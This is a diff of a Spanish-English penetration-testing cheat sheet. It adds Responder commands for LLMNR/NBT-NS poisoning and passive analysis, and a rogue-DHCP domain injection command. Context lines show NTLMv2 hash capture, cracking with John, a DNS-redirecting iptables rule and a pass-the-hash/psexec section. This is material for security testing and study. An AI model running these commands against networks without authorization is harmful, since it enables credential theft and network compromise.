@@ -25,7 +25,19 @@ Several options are available, those are :
 - b : Use HTTP basic authentication, this is used to capture clear text password. By default this option is set to false (NTLM auth)
 - s : Turn HTTP server On/Off. By default the HTTP is enabled.
 
-#responder -I eth0  → Ponemos a trabajar a responder
+#responder.py -i YourIP -A              → -A Analyze Mode, be a ninja; Port scanning is for losers.
+
+#responder.py -i YourIP -rFv            → -r use workstation redirector for NBT-NS
+       					→ -F force auth on wpad.dat files retrieval (highly efficient)
+                                        → -v be verbose, print all queries.
+
+#responder -I eth0 -i 192.168.1.10 -A   → Analizamos las consultas LLMNR NBT-NS y Browser requests sin envenenar ni obtener 
+				          credenciales
+					  'This new mode offers a number of advantages for penetration testers looking to maximize 
+					  stealth and perform reconnaissance. Passively discovered systems can be selectively added 
+					  to the target whitelist option within the Responder.conf configuration file'
+					
+#responder -I eth0                      → Ponemos a trabajar a responder
 En caso de Hashes capturados, ver carpeta /responder/logs, por ej. HTTP-NTLMv2-192.9.200.174.txt
 #john HTTP-NTLMv2-192.9.200.174.txt     → destripamos con John
 
@@ -45,7 +57,16 @@ Ahora podemos crear una regla de Firewall con iptables para responder todos las 
 #iptables -t nat-A PREROUTING -p udp --dst 192.168.3.58 --dport 53 -j DNAT--to-destination 192.168.2.10:53
 Fromthere, Responder will reply to DNS requests and make use of its rogueauthentication servers.
 
-	       
+#FindSQLSrv.py            → Map MSSQL servers on your subnet, one packet.
+
+#DHCP.py -I eth0 -i 10.20.30.40 -d pwned.com -p 10.20.30.40 -s 10.20.30.1 -r 10.20.40.1
+→ -i nuestra IP
+→ -d Domain to inject
+→ -p Primary Domain to inject
+→ -s Secondary Domain to inject
+→ -r Gateway/Router to inject
+
+
 REF:
 https://www.trustwave.com/Resources/SpiderLabs-Blog/Introducing-Responder-1-0/
 https://www.trustwave.com/Resources/SpiderLabs-Blog/Owning-Windows-Networks-with-Responder-1-7/
@@ -589,8 +610,12 @@ c:>>escriba una contraseña para el usuario:  ;);););););););););)
 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-Pass the hash
-
+ ____   _    ____ ____    _____ _   _ _____   _   _    _    ____  _   _ 
+|  _ \ / \  / ___/ ___|  |_   _| | | | ____| | | | |  / \  / ___|| | | |
+| |_) / _ \ \___ \___ \    | | | |_| |  _|   | |_| | / _ \ \___ \| |_| |
+|  __/ ___ \ ___) |__) |   | | |  _  | |___  |  _  |/ ___ \ ___) |  _  |
+|_| /_/   \_\____/____/    |_| |_| |_|_____| |_| |_/_/   \_\____/|_| |_|
+                                                                        
 """""""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
 Set the options and then exploit......
